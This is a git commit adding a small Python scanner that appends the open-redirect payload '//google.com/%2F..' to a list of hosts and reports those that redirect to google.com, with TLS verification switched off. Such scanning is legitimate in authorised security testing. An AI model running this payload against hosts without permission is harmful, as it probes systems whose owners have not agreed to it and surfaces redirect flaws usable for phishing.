a322bfc6e90d01cb2cf006d144ccaaed00a5ecfb
Siddhu Varma <ethancruize@gmail.com>
2017-10-20 23:16:35 +0530

    Create Spine.py

---
+++ spine.py
@@ -0,0 +1,29 @@
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+
+
+
+def operate(url,line):
+	try:
+		r = requests.get(url,verify=False, allow_redirects=True,timeout=3)
+		requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+		resurl=r.url
+		if "https://google.com/" in resurl:
+			print ("Vulnearble - " + line).strip()
+		else:
+			pass
+	except:
+		pass
+
+
+
+def main():
+	threads = []
+	payload="//google.com/%2F..".strip()		
+	file = open("min.txt","r")
+	for line in file:
+		url = "http://"+line.strip()
+		final_url=url+payload
+		operate(final_url,line)
+main()
